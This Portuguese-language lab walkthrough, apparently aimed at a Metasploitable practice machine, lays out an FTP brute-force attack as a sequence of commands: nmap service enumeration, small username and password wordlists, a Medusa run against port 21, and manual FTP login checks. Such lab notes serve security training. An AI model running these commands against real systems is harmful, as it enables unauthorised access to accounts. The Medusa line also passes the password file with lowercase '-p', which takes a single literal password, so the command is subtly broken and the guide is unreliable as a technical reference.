# BRUTEFORCE MEDUSA PORTA FTP

## Teste de conexão com a máquina alvo

```bash
ping -c 3 (IP DA MÁQUINA ALVO)  #para ver se alcança a outra máquina 
```

## FTP Auditoria e Enumeração

Enumeração com `NMAP`

```bash
nmap -sV -p 21,22,80,445,139 (IP DA MÁQUINA ALVO)
```

Confirmação da conexão direta na porta

```bash
ftp (IP DA MÁQUINA ALVO)
```

## Criação das listas de usuários possíveis para acesso e automatização com `MEDUSA`

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

## Criação da lista de senhas para acesso e automatização com `MEDUSA`

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin\nWelcome123\npass" > pass.txt
```

## BRUTEFORCE `MEDUSA`


```bash
medusa -h (IP ALVO) -U users.txt -p pass.txt -M ftp -t 6
```

### Validação Manual com acesso direto ao FTP

```bash
ftp (IP DA MÁQUINA ALVO)
```
